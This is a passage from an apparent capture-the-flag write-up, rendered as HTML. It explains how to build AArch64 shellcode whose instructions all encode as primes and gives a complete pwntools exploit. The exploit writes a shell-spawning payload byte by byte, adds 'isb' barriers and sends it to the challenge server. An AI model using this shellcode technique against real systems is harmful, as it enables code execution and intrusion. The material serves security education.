+         +--------------------+                             v</code></pre><p>But wait… aren’t we executing our shellcode in an area that… writes our shellcode ?? Yes. And this causes a synchronization problem on <strong>Aarch64</strong> (<a href="https://developer.arm.com/documentation/100941/0101/Barriers">see this article</a>)</p>
+<p>To carefully synchronize, we have to use <code>isb</code> instruction : it flushes the CPU’s instruction pipeline and ensures that any changes to the program state (like memory writes or cache invalidations) are observed before the processor fetches and executes new instructions.</p>
+<p>But <code>isb</code> isn’t prime on its own : it is still odd (and potentially prime). I can manually find a valid value with this instruction and <code>isb #7</code> is prime.</p>
+<p>I still have some space left between the start of the payload and <code>br x0</code> so i can spray this instruction 8 times.</p>
+<p>Why multiple times ? Idk maybe to increase chance of synchronizing and because i was tired i wanted it to work lol</p>
+<p>Here is the final strategy :</p>
+
+
+
+
+
+<pre tabindex="0"><code>         +--------------------+                             |
++------&gt; | mov w27, #7        | (nop : start of shellcode)  | &lt;--- x0 points here
+|        +--------------------+                             | 
+|        | start of payload   |                             |
+|        | that will write    |                             |
+|        | the shellcode      |                             |
+|        +--------------------+                             | 
+|        | isb #7             |                             |
+|        | isb #7             |                             | Execution flow
+|        | isb #7             |                             |
+|        | isb #7             |                             |
+|        | isb #7             |                             |
+|        | isb #7             |                             |
+|        | isb #7             |                             |
+|        | isb #7             |                             |
+|        +--------------------+                             |
++------- | br x0              | written by our payload      |
+         +--------------------+                             v</code></pre><h2 id="final-exploit">Final Exploit</h2>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">l1</span> <span class="o">=</span> <span class="p">{</span><span class="mi">7</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384120571</span><span class="p">,</span> <span class="s1">&#39;mov w27, #7&#39;</span><span class="p">),</span> <span class="mi">22</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384121051</span><span class="p">,</span> <span class="s1">&#39;mov w27, #22&#39;</span><span class="p">),</span> <span class="mi">28</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384121243</span><span class="p">,</span> <span class="s1">&#39;mov w27, #28&#39;</span><span class="p">),</span> <span class="mi">53</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384122043</span><span class="p">,</span> <span class="s1">&#39;mov w27, #53&#39;</span><span class="p">),</span> <span class="mi">65</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384122427</span><span class="p">,</span> <span class="s1">&#39;mov w27, #65&#39;</span><span class="p">),</span> <span class="mi">67</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384122491</span><span class="p">,</span> <span class="s1">&#39;mov w27, #67&#39;</span><span class="p">),</span> <span class="mi">80</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384122907</span><span class="p">,</span> <span class="s1">&#39;mov w27, #80&#39;</span><span class="p">),</span> <span class="mi">86</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384123099</span><span class="p">,</span> <span class="s1">&#39;mov w27, #86&#39;</span><span class="p">),</span> <span class="mi">97</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384123451</span><span class="p">,</span> <span class="s1">&#39;mov w27, #97&#39;</span><span class="p">),</span> <span class="mi">98</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384123483</span><span class="p">,</span> <span class="s1">&#39;mov w27, #98&#39;</span><span class="p">),</span> <span class="mi">100</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384123547</span><span class="p">,</span> <span class="s1">&#39;mov w27, #100&#39;</span><span class="p">),</span> <span class="mi">122</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384124251</span><span class="p">,</span> <span class="s1">&#39;mov w27, #122&#39;</span><span class="p">),</span> <span class="mi">125</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384124347</span><span class="p">,</span> <span class="s1">&#39;mov w27, #125&#39;</span><span class="p">),</span> <span class="mi">140</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384124827</span><span class="p">,</span> <span class="s1">&#39;mov w27, #140&#39;</span><span class="p">),</span> <span class="mi">143</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384124923</span><span class="p">,</span> <span class="s1">&#39;mov w27, #143&#39;</span><span class="p">),</span> <span class="mi">157</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384125371</span><span class="p">,</span> <span class="s1">&#39;mov w27, #157&#39;</span><span class="p">),</span> <span class="mi">158</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384125403</span><span class="p">,</span> <span class="s1">&#39;mov w27, #158&#39;</span><span class="p">),</span> <span class="mi">160</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384125467</span><span class="p">,</span> <span class="s1">&#39;mov w27, #160&#39;</span><span class="p">),</span> <span class="mi">176</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384125979</span><span class="p">,</span> <span class="s1">&#39;mov w27, #176&#39;</span><span class="p">),</span> <span class="mi">197</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384126651</span><span class="p">,</span> <span class="s1">&#39;mov w27, #197&#39;</span><span class="p">),</span> <span class="mi">202</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384126811</span><span class="p">,</span> <span class="s1">&#39;mov w27, #202&#39;</span><span class="p">),</span> <span class="mi">223</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384127483</span><span class="p">,</span> <span class="s1">&#39;mov w27, #223&#39;</span><span class="p">),</span> <span class="mi">227</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384127611</span><span class="p">,</span> <span class="s1">&#39;mov w27, #227&#39;</span><span class="p">),</span> <span class="mi">235</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384127867</span><span class="p">,</span> <span class="s1">&#39;mov w27, #235&#39;</span><span class="p">),</span> <span class="mi">238</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384127963</span><span class="p">,</span> <span class="s1">&#39;mov w27, #238&#39;</span><span class="p">),</span> <span class="mi">241</span><span class="p">:</span> <span class="p">(</span><span class="mi">1384128059</span><span class="p">,</span> <span class="s1">&#39;mov w27, #241&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">l2</span> <span class="o">=</span> <span class="p">{</span><span class="mi">5</span><span class="p">:</span> <span class="p">(</span><span class="mi">1358960507</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #5&#39;</span><span class="p">),</span> <span class="mi">19</span><span class="p">:</span> <span class="p">(</span><span class="mi">1358974843</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #19&#39;</span><span class="p">),</span> <span class="mi">20</span><span class="p">:</span> <span class="p">(</span><span class="mi">1358975867</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #20&#39;</span><span class="p">),</span> <span class="mi">23</span><span class="p">:</span> <span class="p">(</span><span class="mi">1358978939</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #23&#39;</span><span class="p">),</span> <span class="mi">58</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359014779</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #58&#39;</span><span class="p">),</span> <span class="mi">59</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359015803</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #59&#39;</span><span class="p">),</span> <span class="mi">61</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359017851</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #61&#39;</span><span class="p">),</span> <span class="mi">71</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359028091</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #71&#39;</span><span class="p">),</span> <span class="mi">73</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359030139</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #73&#39;</span><span class="p">),</span> <span class="mi">91</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359048571</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #91&#39;</span><span class="p">),</span> <span class="mi">115</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359073147</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #115&#39;</span><span class="p">),</span> <span class="mi">118</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359076219</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #118&#39;</span><span class="p">),</span> <span class="mi">125</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359083387</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #125&#39;</span><span class="p">),</span> <span class="mi">133</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359091579</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #133&#39;</span><span class="p">),</span> <span class="mi">143</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359101819</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #143&#39;</span><span class="p">),</span> <span class="mi">164</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359123323</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #164&#39;</span><span class="p">),</span> <span class="mi">166</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359125371</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #166&#39;</span><span class="p">),</span> <span class="mi">170</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359129467</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #170&#39;</span><span class="p">),</span> <span class="mi">173</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359132539</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #173&#39;</span><span class="p">),</span> <span class="mi">208</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359168379</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #208&#39;</span><span class="p">),</span> <span class="mi">223</span><span class="p">:</span> <span class="p">(</span><span class="mi">1359183739</span><span class="p">,</span> <span class="s1">&#39;sub w27, w27, #223&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">l3</span> <span class="o">=</span> <span class="p">{</span><span class="mi">6</span><span class="p">:</span> <span class="p">(</span><span class="mi">285219707</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #6&#39;</span><span class="p">),</span> <span class="mi">12</span><span class="p">:</span> <span class="p">(</span><span class="mi">285225851</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #12&#39;</span><span class="p">),</span> <span class="mi">32</span><span class="p">:</span> <span class="p">(</span><span class="mi">285246331</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #32&#39;</span><span class="p">),</span> <span class="mi">39</span><span class="p">:</span> <span class="p">(</span><span class="mi">285253499</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #39&#39;</span><span class="p">),</span> <span class="mi">44</span><span class="p">:</span> <span class="p">(</span><span class="mi">285258619</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #44&#39;</span><span class="p">),</span> <span class="mi">54</span><span class="p">:</span> <span class="p">(</span><span class="mi">285268859</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #54&#39;</span><span class="p">),</span> <span class="mi">66</span><span class="p">:</span> <span class="p">(</span><span class="mi">285281147</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #66&#39;</span><span class="p">),</span> <span class="mi">72</span><span class="p">:</span> <span class="p">(</span><span class="mi">285287291</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #72&#39;</span><span class="p">),</span> <span class="mi">75</span><span class="p">:</span> <span class="p">(</span><span class="mi">285290363</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #75&#39;</span><span class="p">),</span> <span class="mi">101</span><span class="p">:</span> <span class="p">(</span><span class="mi">285316987</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #101&#39;</span><span class="p">),</span> <span class="mi">104</span><span class="p">:</span> <span class="p">(</span><span class="mi">285320059</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #104&#39;</span><span class="p">),</span> <span class="mi">105</span><span class="p">:</span> <span class="p">(</span><span class="mi">285321083</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #105&#39;</span><span class="p">),</span> <span class="mi">107</span><span class="p">:</span> <span class="p">(</span><span class="mi">285323131</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #107&#39;</span><span class="p">),</span> <span class="mi">111</span><span class="p">:</span> <span class="p">(</span><span class="mi">285327227</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #111&#39;</span><span class="p">),</span> <span class="mi">114</span><span class="p">:</span> <span class="p">(</span><span class="mi">285330299</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #114&#39;</span><span class="p">),</span> <span class="mi">117</span><span class="p">:</span> <span class="p">(</span><span class="mi">285333371</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #117&#39;</span><span class="p">),</span> <span class="mi">119</span><span class="p">:</span> <span class="p">(</span><span class="mi">285335419</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #119&#39;</span><span class="p">),</span> <span class="mi">122</span><span class="p">:</span> <span class="p">(</span><span class="mi">285338491</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #122&#39;</span><span class="p">),</span> <span class="mi">137</span><span class="p">:</span> <span class="p">(</span><span class="mi">285353851</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #137&#39;</span><span class="p">),</span> <span class="mi">156</span><span class="p">:</span> <span class="p">(</span><span class="mi">285373307</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #156&#39;</span><span class="p">),</span> <span class="mi">159</span><span class="p">:</span> <span class="p">(</span><span class="mi">285376379</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #159&#39;</span><span class="p">),</span> <span class="mi">171</span><span class="p">:</span> <span class="p">(</span><span class="mi">285388667</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #171&#39;</span><span class="p">),</span> <span class="mi">180</span><span class="p">:</span> <span class="p">(</span><span class="mi">285397883</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #180&#39;</span><span class="p">),</span> <span class="mi">186</span><span class="p">:</span> <span class="p">(</span><span class="mi">285404027</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #186&#39;</span><span class="p">),</span> <span class="mi">200</span><span class="p">:</span> <span class="p">(</span><span class="mi">285418363</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #200&#39;</span><span class="p">),</span> <span class="mi">207</span><span class="p">:</span> <span class="p">(</span><span class="mi">285425531</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #207&#39;</span><span class="p">),</span> <span class="mi">209</span><span class="p">:</span> <span class="p">(</span><span class="mi">285427579</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #209&#39;</span><span class="p">),</span> <span class="mi">219</span><span class="p">:</span> <span class="p">(</span><span class="mi">285437819</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #219&#39;</span><span class="p">),</span> <span class="mi">227</span><span class="p">:</span> <span class="p">(</span><span class="mi">285446011</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #227&#39;</span><span class="p">),</span> <span class="mi">240</span><span class="p">:</span> <span class="p">(</span><span class="mi">285459323</span><span class="p">,</span> <span class="s1">&#39;add w27, w27, #240&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov w27, #7&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">mov_sp_x0</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov sp, x0&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">store_sp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;strb w27, [sp]&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">add_sp_1</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add sp, sp, #6&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub sp, sp, #5&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">br_x0</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;br x0&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">def</span> <span class="nf">strb_sp_w27</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l2</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># sub</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="n">j</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">g</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">k</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">                    <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="k">def</span> <span class="nf">write_byte_with_sp</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">f</span> <span class="o">+=</span> <span class="n">strb_sp_w27</span><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="n">store_sp</span> <span class="o">+</span> <span class="n">add_sp_1</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">return</span> <span class="n">f</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">
+</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe1\x45\x8c\xf2\x21\xcd\xad\xf2\xe1\xe5\xc5\xf2\x61\x0e\xed\xf2\xe2\x03\x1f\xca\xe1\x0b\x84\xa8\xe1\x03\x1f\xca\xe0\x03\x01\xd1\xa8\x1b\x80\xd2\xe1\x66\x02\xd4</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="ln">37</span><span class="cl">
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">+</span> <span class="n">mov_sp_x0</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">write_byte_with_sp</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add sp,sp,#0x370&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">write_byte_with_sp</span><span class="p">(</span><span class="n">br_x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;isb #7&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">
+</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">
+</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chall.fcsc.fr&#34;</span><span class="p">,</span><span class="mi">2101</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><script>
+
+
+</script>
+
+<script>
+var all_codeblocks = document.getElementsByClassName("chroma")
+for(let i=0;i<all_codeblocks.length;i++)
+{
+    all_lines_of_a_codeblock = all_codeblocks[i].getElementsByClassName("line");
+    let start_number = -1;
+    start_number = parseInt(all_lines_of_a_codeblock[0].getElementsByTagName("span")[2].innerHTML,10);
+    all_lines_of_a_codeblock[0].style.display = "none";
+    for(let line=1;line<all_lines_of_a_codeblock.length;line++)
+    {
+        let max_len = Math.log10(String(all_lines_of_a_codeblock.length).length)
+        let current_len = Math.log10(String(start_number).length)
+        if(Math.ceil(max_len) - Math.ceil(current_len) > 0)
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number) + "<span style='visibility:hidden;'>" + "0".repeat(Math.ceil(max_len) - Math.ceil(current_len)) + "</span>";
+        }
+        else
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number);
+        }
+        start_number = start_number + 1;
+    }
+}
+</script>
+
+</content>
+<p>
+  
+</p>
+
+
+
+
+  </main>
+  <footer></footer>
+
+    
+</body>
+
+</html>
